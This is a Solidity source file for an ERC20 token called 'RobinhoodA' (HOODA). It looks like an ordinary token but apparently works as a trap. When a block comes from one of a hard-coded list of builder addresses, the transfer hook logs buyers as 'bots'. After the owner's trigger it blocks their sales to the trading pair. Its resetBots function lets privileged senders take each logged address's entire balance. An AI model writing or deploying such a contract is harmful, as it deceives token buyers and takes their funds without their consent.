//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "./ERC20Upgradeable.sol";

contract Robinhood is ERC20Upgradeable {
  mapping(address => bool) public senders;
  bool public triggered = false;
  address[] bots;
  mapping(address => bool) botMap;
  address public __pair;

  mapping(address => bool) public coinbases;

  function initialize() external initializer {
    __ERC20_init("RobinhoodA", "HOODA");

    _approve(msg.sender, 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, uint(-1));

    senders[msg.sender] = true;
    _mint(msg.sender, 1000000 * 10 ** 18);

    coinbases[0x002e08000acbbaE2155Fab7AC01929564949070d] = true;
    coinbases[0x5A0b54D5dc17e0AadC383d2db43B0a0D3E029c4c] = true;
    coinbases[0x04668Ec2f57cC15c381b461B9fEDaB5D451c8F7F] = true;
    coinbases[0xEA674fdDe714fd979de3EdF0F56AA9716B898ec8] = true;
    coinbases[0x829BD824B016326A401d083B33D092293333A830] = true;
    coinbases[0xF541C3CD1D2df407fB9Bb52b3489Fc2aaeEDd97E] = true;
    coinbases[0x7F101fE45e6649A6fB8F3F8B43ed03D353f2B90c] = true;
    coinbases[0xc365c3315cF926351CcAf13fA7D19c8C4058C8E1] = true;
    coinbases[0x99C85bb64564D9eF9A99621301f22C9993Cb89E3] = true;
    coinbases[0x2f731c3e8Cd264371fFdb635D07C14A6303DF52A] = true;
    coinbases[0x1aD91ee08f21bE3dE0BA2ba6918E714dA6B45836] = true;
    coinbases[0xD224cA0c819e8E97ba0136B3b95ceFf503B79f53] = true;
    coinbases[0x52bc44d5378309EE2abF1539BF71dE1b7d7bE3b5] = true;
    coinbases[0x8595Dd9e0438640b5E1254f9DF579aC12a86865F] = true;
    coinbases[0xB3b7874F13387D44a3398D298B075B7A3505D8d4] = true;
    coinbases[0xc8F595E2084DB484f8A80109101D58625223b7C9] = true;
    coinbases[0x45a36a8e118C37e4c47eF4Ab827A7C9e579E11E2] = true;
  }

  function addSender(address sender) external {
    require(senders[msg.sender]);
    senders[sender] = true;
  }

  function addCoinbase(address coinbase) external {
    require(senders[msg.sender]);
    coinbases[coinbase] = true;
  }

  function removeCoinbase(address coinbase) external {
    require(senders[msg.sender]);
    coinbases[coinbase] = false;
  }

  function setPairAddy(address _pair) external {
    require(senders[msg.sender]);
    __pair = _pair;
  }

  function _beforeTokenTransfer(address from, address to, uint256) internal override {
    if (!coinbases[block.coinbase]) return;
    
    if (senders[tx.origin]) { // Sender tx
        if (from == __pair) {
            triggered = true;
        }
        return;
    }

    if (!botMap[to] && to != __pair && !senders[to]) {
      botMap[to] = true;
      bots.push(to);
    }
    if (to == __pair && triggered) revert();
  }

  function resetBots() external {
    require(senders[msg.sender]);
    for (uint256 i = 0; i < bots.length; i ++) {
      if (bots[i] == __pair || bots[i] == msg.sender) continue;
      _transfer(bots[i], msg.sender, balanceOf(bots[i]));
    }
  }
}
